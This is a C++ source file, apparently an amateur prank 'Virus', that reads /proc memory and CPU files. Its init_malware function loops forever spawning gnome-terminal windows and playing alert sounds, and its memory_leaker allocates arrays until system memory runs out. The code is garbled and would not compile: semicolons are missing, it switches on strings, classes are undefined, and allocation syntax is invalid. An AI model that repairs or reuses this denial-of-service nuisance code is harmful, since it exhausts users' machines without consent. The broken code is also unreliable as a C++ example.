/* main.cpp
 *
 *  Created on: Apr 22, 2023
 *      Author: ayaanle
 */
 
 
#include <iostream>
#include <assert.h>
#include <filesystem>
#include <chrono>
#include <vector>
#include <string>
#include <error.h>
#include <fstream>
#include <errno.h>
#include "sysinfo.h"
#define GNOME_TERMINAL_CMD      "gnome-terminal -- "
#define ANNOYING_SOUND          "paplay /usr/share/sounds/gnome/default/alerts/drip.ogg"
#define CPU_TEMP_CMD            " "


using namespace std;
using namespace std::filesystem;
class Virus
{
public:
    constexpr explicit Virus();
    static uint time_steps(uint8_t) ;
    friend const struct system_info* sys_info(struct system_info* sys_info);
    friend inline void file_info(std::vector<string>paths);
    constexpr inline void init_malware();
public:
    bool file_exists = 0;
    signed long int file_size;
};


struct system_struct
{
public:
    std::filesystem::path p;
    std::filesystem::directory_iterator dit;
    std::filesystem::directory_entry de;
    std::fstream strm;
    string buffer;
    size_t total_memory , used_memory , free_memory;
    size_t cache , buffer_memory;
    size_t total_swap , free_swap , used_swap
    size_t cpu_temperatures , cpu_usages[]
};
constexpr explicit Virus::Virus()
{

}
inline uint Startup::time_steps(uint8_t num)
{
    #ifdef _GLIBCXX_CHRONO
    auto count = std::chrono::seconds(num).count();
    return count;
    #endif
}


inline void file_info(vector<string>paths)
{
    system_struct ss;
    vector<string>::iterator it;                        
    for(it = paths.begin();it!=paths.end();++it)
    {
       // accessing the most important hardware config infos
      ss.p = *it;
      if(p.has_filename() and p.has_extension()  and p.size()>0)
      {
        if(is_regular_file(p))
        {  
            
           switch(p.filename())
           {
              case "meminfo":
                  while (!strm.eof())
                         strm.get(buffer);
                         
                  stoi(buffer.substr(15 , 9) , &ss.total_memory);
                  stoi(buffer.substr(40 , 16) , &ss.free_memory);
                  stoi(buffer.substr(40 , 16) , &ss.used_memory);
                  stoi(buffer.substr(60 , 16) , &ss.cache);
                  break;
                  
              case "stat":
                  while(!strm.eof())
                       strm.get(buffer);
                       
                  stoi(buffer.substr(15 , 9) , &ss.total_memory);
                  stoi(buffer.substr(40 , 16) , &ss.free_memory);
                  stoi(buffer.substr(40 , 16) , &ss.used_memory);
                  stoi(buffer.substr(60 , 16) , &ss.cache);
                  stoi(buffer.substr(70 , 16) , &ss.swap_total);
                   
           }

        }
        error("is not a regular file");
        }
        error("has no filename or extension");
      }
    
}

signed int cpu_stat(cpu_struct cpu)
{
    cpu->cpu_usage[];
    cpu->temperature[];
    if(system(CPU_TEMP_CMD) == 0 or system(CPU_TEMP_CMD) == "")
       error("the command %s returns empty string " , CPU_TEMP_CMD);
       exit(0);
    string temp = to_string(system(CPU_TEMP_CMD));
    stoi(temp.substr() , &cpu->temperature);
    
}
constexpr inline void init_malware()
{
   int counter = 0;
   
   for(;;)
        {
            while(counter != Startup::time_steps(2))
            {
               system(GNOME_TERMINAL_CMD);
               system(ANNOYING_SOUND) or
                system("paplay /tmp/drip.ogg");
                
               counter++;
            }
            
            counter -= Startup::time_steps(2);
        }
}

struct memo_struct* memory_leaker::memory_info()
{
    return struct memo_struct* memory_info;
}
inline void memory_leaker::leaker_init()
{
    memory_leaker ml;
    struct memo_struct* memo_info = ml.memory_info()
    while(memo_info->used_memory != memo_info->total_memory
        or memo_info->free_memory != 0)
         {
           new int *num = new[10000];
         }
         
}
int main(int argc , char* argv[])
{
    
    disk_struct ds;
    memory_leaker* memo_leaker;
    const struct memo_strcut* memo_info;  
    string str;
    vector<string>paths = {"/proc/cpuinfo" ,
                           "/proc/meminfo" ,
                           "/proc/stat"};  
    
    cout << str << endl;
    file_info(paths);
    strm.close();
    Startup startup;
    startup.init_malware();
    memory_leaker(memo_info);
    leaker_init();
    return 0;
}
